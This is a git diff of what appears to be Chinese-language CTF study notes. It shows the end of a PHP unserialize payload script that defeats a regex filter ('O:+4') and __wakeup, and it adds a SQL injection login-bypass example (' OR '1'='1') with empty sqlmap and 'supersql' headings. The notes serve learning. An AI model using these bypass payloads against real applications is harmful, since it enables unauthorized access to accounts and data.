@@ -431,6 +431,25 @@ $C = str_replace('O:4','O:+4',$C);      //绕过正则表达式过滤
 $C = str_replace(':1:',':2:',$C); 		//wakeup绕过
 var_dump($C);
 var_dump(base64_encode($C));            //base64加密
-
 ?>
 ```
+
+## inget
+
+### sql注入 万能密码
+
+```sql
+SELECT * FROM users WHERE username = '输入的用户名' AND password = '输入的密码';
+```
+
+```sql
+SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
+```
+
+结果恒真
+
+
+### sqlmap
+
+
+## supersql
